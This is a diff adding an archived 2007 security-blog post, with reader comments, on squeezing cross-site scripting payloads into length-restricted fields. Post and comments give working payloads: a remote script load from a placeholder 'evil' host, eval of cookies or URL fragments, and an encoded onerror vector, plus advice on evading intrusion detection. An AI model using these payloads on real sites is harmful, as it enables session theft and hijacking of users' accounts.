@@ -1,0 +1,96 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Playing in Large</title><meta name="description" content="&gt; Many times, Web Applications enforce restrictions on the number of characters the user can input. That happens quite often since this is probably the easiest and most obvious way of sanitizing the user input. Overcoming these restrictions, when performing Cross-site scripting attacks, is a challenge, so I am going to discuss a few techniques that I have developed, which prove to be quite useful in various situations."><meta property="name" content="Playing in Large"><meta itemprop="name" content="Playing in Large"><meta property="description" content="&gt; Many times, Web Applications enforce restrictions on the number of characters the user can input. That happens quite often since this is probably the easiest and most obvious way of sanitizing the user input. Overcoming these restrictions, when performing Cross-site scripting attacks, is a challenge, so I am going to discuss a few techniques that I have developed, which prove to be quite useful in various situations."><meta itemprop="description" content="&gt; Many times, Web Applications enforce restrictions on the number of characters the user can input. That happens quite often since this is probably the easiest and most obvious way of sanitizing the user input. Overcoming these restrictions, when performing Cross-site scripting attacks, is a challenge, so I am going to discuss a few techniques that I have developed, which prove to be quite useful in various situations."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fplaying-in-large%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fplaying-in-large%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/playing-in-large/"><meta property="og:title" content="Playing in Large"><meta property="og:description" content="&gt; Many times, Web Applications enforce restrictions on the number of characters the user can input. That happens quite often since this is probably the easiest and most obvious way of sanitizing the user input. Overcoming these restrictions, when performing Cross-site scripting attacks, is a challenge, so I am going to discuss a few techniques that I have developed, which prove to be quite useful in various situations."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fplaying-in-large%2F?w=1024"><meta name="twitter:title" content="Playing in Large"><meta name="twitter:description" content="&gt; Many times, Web Applications enforce restrictions on the number of characters the user can input. That happens quite often since this is probably the easiest and most obvious way of sanitizing the user input. Overcoming these restrictions, when performing Cross-site scripting attacks, is a challenge, so I am going to discuss a few techniques that I have developed, which prove to be quite useful in various situations."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fplaying-in-large%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Playing in Large</h1><div>Tue, 06 Feb 2007 14:18:53 GMT</div><div id="post-content"><blockquote>
+<p>Many times, Web Applications enforce restrictions on the number of characters the user can input. That happens quite often since this is probably the easiest and most obvious way of sanitizing the user input. Overcoming these restrictions, when performing Cross-site scripting attacks, is a challenge, so I am going to discuss a few techniques that I have developed, which prove to be quite useful in various situations.</p>
+</blockquote>
+<p>When you are restricted by the size of input, you have to think about the smallest possible unit that can expand to something that is much bigger. In traditional buffer overflow vulnerabilities attackers take advantage of various packaging techniques. Sometimes, the overflow crack is so small that only 140-160 bites (figuratively speaking) of data can squeeze in. This obstacle is overcome by injecting small piece of binary code that downloads additional, much larger, piece of code (probably an executable). Similar principles apply to Cross-site scripting vulnerabilities. Let&#39;s generalize the XSS payload structure in order to find how to squeeze data into a <strong>N</strong> characters long field.</p>
+<p>When dealing with Cross-site scripting vulnerabilities we may need to close or fix the markup to the place where the injection occurs. This adds a few characters, so we need to count them as part of the payload. Think about them as a nop sled. If the injection occurs inside an element attribute, you may need to inject something like the following:</p>
+<pre><code>&quot;&gt;[payload]&lt;!--</code></pre><p>The first two characters will close/fix the markup to the place where the injection occurs. Then the payload follows. After the payload everything else is commented out to ensure that nothing breaks the injected code. This adds four characters at the end.</p>
+<p>Most of the time, when more then the maximum characters needs to be inject, attackers go through the extreme situation of including a remote JavaScript file via a <code>SCRIPT</code> tag. For example:</p>
+<pre><code>&quot;&gt;&lt;script src=&quot;http://path/to/evil&quot;&gt;&lt;/script&gt;&lt;!--</code></pre><p>This file can be of any size and can contain as much code as we want. However, like overflow vulnerabilities, this technique is fairly restricted in terms of the easily applicable preventing mechanisms against it.</p>
+<p>If you imagine that the payload, discussed above, is part of an AJAX worm, the easiest way to fight the malware back is to block access to <code>http://path/to/evil</code>. That of course is not the desired effect attackers try to achieve.</p>
+<p>In order to bypass the restriction without using external resources you need to look for a way of transmitting information to the exploited target. This can be achieved by setting the cookie wit CSRF, for example, and evaluating its content inside the browser. The following may become our payload:</p>
+<pre><code>&quot;&gt;&lt;script&gt;eval(document.cookie)&lt;/script&gt;&lt;!--</code></pre><p>Sneaky! This technique relies on a different vulnerability so it might not be the best way of achieving the desires result.</p>
+<p>Fortunately or not, WEB technologies are so flexible that attackers can always find ways to squeeze stuff in the fields they are after. Here is how we can change the payload in order to fit a couple of kilobytes JavaScript code inside 60 characters long field.</p>
+<pre><code>&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;&lt;!--</code></pre><p>The payload above is composed of 55 characters in total. This includes the sled and the end fix. What this snippet does is evaluating everything that is part of the hash (fragment identifier), which is part of the URL. The above payload can be translated into the following imaginative attack URL.</p>
+<pre><code>http://path/to/vulnerable/application?vuln=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;&lt;!--#**[payload]**</code></pre><p>If you replace &quot;<strong>[payload]</strong>&quot; with the code your want to execute then in practice you inject 55 characters into the server side application and the rest is obtained by the client. The server side restriction is bypassed. This attack can be refined to produce even smaller injected payload. For example:</p>
+<pre><code>http://path/to/vulnerable/application?vuln=&quot;&gt;&lt;script&gt;eval(location.substr(92))&lt;/script&gt;&lt;!--#**[payload]**</code></pre><p>The example above presents a reduced payload that is composed of 48 characters in total. Keep in mind that we are still able to evaluate everything that is after the hash or in simple words; we evaluate everything from the URL after the 92nd character.</p>
+<p>Although we are generally discussing how to fit more stuff into a size restricted, unsanitezed field, the techniques presented above are suitable for all kind of situations. In fact, I believe that they are the desired way of performing Cross-site scripting attacks.</p>
+<p>You should know that fragment identifier (the hash) is not part of the server request; as such attackers can use it to hide their malicious activities. Every large URL can trigger the Intrusion Detection system. This is something that attackers try to avoid. If the server activities are less suspicious, the chances of somebody discovering the exploit are also greatly reduced.</p>
+<p>For testing and demonstration purposes you can use the following list of variations of the attack technique discussed in this article:</p>
+<pre><code class="language-javascript"><span class="built_in">eval</span>(location.substr(<span class="number">92</span>))
+setTimeout(location.substr(<span class="number">92</span>))</code></pre>
+<pre><code class="language-javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))
+setTimeout(location.hash.substr(<span class="number">1</span>))</code></pre>
+<pre><code class="language-javascript"><span class="built_in">eval</span>((<span class="string">''</span>+location).substr(<span class="number">28</span>))
+setTimeout((<span class="string">''</span>+location).substr(<span class="number">28</span>))</code></pre>
+<pre><code class="language-javascript"><span class="built_in">eval</span>(location.search.substr(<span class="number">20</span>))
+setTimeout(location.search.substr(<span class="number">20</span>))</code></pre>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Joe"><span>Joe</span><div class="post-comment-content">Hiya,
+
+Nice article. May seem like a stupid question but how do you set cookies with CSRF??
+
+I know it can be done with CRLF but didnt know CSRF could do it?
+
+Cheers,
+Joe</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Joe, I am using hypothetical scenario for this article. However, setting cookies with CSRF are possible in situations where the application you are targeting reflects the data you are sending as cookies. It is confusing, I know. Here is an example.
+
+Let's say that the application ask you for the First and Last name and then stores that information on the server but also on the client (cookie) to eliminate the need for further requests send to the server. The attacker needs to craft a CSRF to set the name for the user and as such setting the cookie to whatever value he/she may need.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Joe"><span>Joe</span><div class="post-comment-content">pdp,
+
+I see, thanks.
+
+I though you were saying you could use CSRF to do a set-cookie: foo 
+
+(Like CRLF)
+
+My bad :)
+
+Again, interesting article and food for thought!
+
+-Joe</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Kishor"><span>Kishor</span><div class="post-comment-content">That was a really nice technique pdp.
+
+Therefore I decided to save more bytes for you.
+You might already know that <strong>&lt;/script&gt;</strong> tag is not required in most of the cases.
+
+Hence
+
+<pre><code>&lt;body&gt;
+&lt;script src=http://localhost/script3.js &gt; &lt;!â€“
+WAHTEVER
+&lt;/body&gt;</code></pre>
+
+Will still result in script getting executed. Although it requires that src attribute be present.
+
+Overall, this is larger than your vector by 2 bytes (which is not good), but with tinyurl, maybe it gets reduced further. But when src attributes are filtered by url white list, your technique still works and this one fails.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Kishor, thanks for the comment. I was thinking to put this in but then I thought that I will get quickly out of scope describing why this thing works. So I decided to go with the KISS principle.
+
+Anyway, good stuff.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="GE"><span>GE</span><div class="post-comment-content">So this seems to just reinforce the idea that developers must remember not to trust the data coming from the client.  From each of the examples, if I validate the input to filter out "</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">They should by default. This article describes what to do when they don't.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="beNi"><span>beNi</span><div class="post-comment-content">hey pdp, nice article.
+
+this is even smaller (51 characters)
+
+<pre><code>&#x27;&#x22;&#x3E;&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x31;&#x20;&#x6F;&#x6E;&#x45;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x65;&#x76;&#x61;&#x6C;&#x28;&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x28;&#x39;&#x32;&#x29;&#x3E;&#x3C;&#x21;&#x2D;&#x2D;</code></pre>
+
+cheers beNi</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">neat :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="MustLive"><span>MustLive</span><div class="post-comment-content">Guys, you may use simple (without comment tag): "&gt;
+It is only 46 characters. When you attacking through iframe you don't need to care about commenting some ending html code.
+
+In my practice of social security audits, I dealt with such cases with CSRF. For example I found a hole, where some data from form (from some fields) was save in cookie. And it was appear on site's pages (from cookie). So when you put XSS code to form's fields - to cookie - via CSRF, than you have XSS attacked the visitor of that site. It is persistent XSS ;-).
+
+P.S.
+
+Nice article, Pdp. I am also using such short XSS sting in my own practice of security audit. Because sometime you need to limit yourself in length of XSS string (because of server restriction).
+
+For example, when I need to show site' owner, that his site is vulnerable, and I have limited XSS payload string I use such payloads:
+
+<pre><code>"&gt;alert(document.cookie)
+41 chars
+"&gt;alert("XSS")
+31 chars
+Or such (if quotes is filtered):
+"&gt;alert(/XSS/)
+31 chars
+Or the shortest one:
+"&gt;alert(1)
+27 chars</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Acidus"><span>Acidus</span><div class="post-comment-content">Great article and good discussion all around.
+
+Just a couple of things:
+
+-You can use setInterval instead of eval or setTimeout. Downsides are it's one character longer and you need to have some code to turn it off when it runs.  However, if they are filtering, its good in a pinch
+
+-I know this is simpled for example, but remember not focus too much on "&gt;&lt;script... attacks. You are attacking a known site, you know which tags the XSS is reflected in. Look for tag attributes that will execute script. It depends, but a simple "onfocus=eval... could do the trick in less space. There are literally thousands of places in the DOM where JavaScript can execute, and only 2 of them are img+onerror and script. Trust me, commerical vendors are doing this :-).</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Yes, you can do quite virtually inject JavaScript into everything from the DOM. I provided a simple example so everyone understands the concept. Interesting thoughts all around.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="thornmaker"><span>thornmaker</span><div class="post-comment-content">#0={}; is a valid javascript statement.  This means that you can add 0={}; after the hash which allows your XSS injection to leave of the .substr(1) part, e.g. "&gt;eval(location.hash)</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
